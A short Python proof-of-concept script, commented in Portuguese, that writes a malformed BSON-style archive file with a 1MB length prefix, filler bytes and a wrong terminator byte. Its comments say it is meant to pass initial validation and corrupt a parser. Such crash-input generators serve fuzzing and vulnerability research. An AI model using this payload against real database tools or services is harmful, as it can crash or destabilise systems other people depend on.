import struct

# Simula um tamanho BSON inválido ou extremo que passa pelas validações iniciais mas corrompe o parser
# MaxBSONSize tipicamente é 16MB (16777216), vamos forçar um tamanho malformado ou inconsistente com o byte nulo
payload_size = 0x00100000 # 1MB
terminator = 0x12345678

with open("payload_malformed.archive", "wb") as f:
    # Escreve o magic number ou prelude falso se necessário, ou direto o tamanho do bloco malformado
    f.write(struct.pack("<I", payload_size))
    # Escreve dados incompletos ou sem o terminador 0x00 no final
    f.write(b"A" * (payload_size - 5))
    f.write(b"\xFF") # Byte final errado (esperado 0x00)

print("[+] Payload malformado gerado: payload_malformed.archive")
